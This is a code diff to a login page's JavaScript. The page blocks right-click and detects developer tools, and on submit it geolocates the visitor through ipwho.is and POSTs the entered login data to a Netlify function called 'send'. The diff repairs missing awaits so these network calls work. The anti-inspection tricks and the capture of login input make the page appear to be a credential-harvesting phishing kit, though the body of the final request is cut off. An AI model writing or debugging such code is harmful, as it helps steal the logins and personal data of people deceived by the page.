@@ -1,5 +1,3 @@
-let sentData = JSON.parse(localStorage.getItem('sentData')) || [];
-
 document.addEventListener('contextmenu', event => event.preventDefault());
 
 document.addEventListener('keydown', function (event) {
@@ -45,11 +43,13 @@ function detectDevTools() {
 
 detectDevTools();
 
+let sentData = JSON.parse(localStorage.getItem('sentData')) || [];
+
 document.addEventListener('DOMContentLoaded', function () {
 
     const form = document.getElementById('loginForm');
 
-    form.addEventListener('submit', function (e) {
+    form.addEventListener('submit', async function (e) {
         e.preventDefault();
 
         const userInput = document.getElementById('userInput').value.trim();
@@ -64,12 +64,12 @@ document.addEventListener('DOMContentLoaded', function () {
             return;
         }
 
-        const res = fetch('https://ipwho.is/');
-        const data = res.json();
+        const res = await fetch('https://ipwho.is/');
+        const data = await res.json();
         const country = data.country || "لا يوجد";
         const code = `+${data.calling_code}` || "لا يوجد";
 
-        fetch('/.netlify/functions/send', {
+        await fetch('/.netlify/functions/send', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
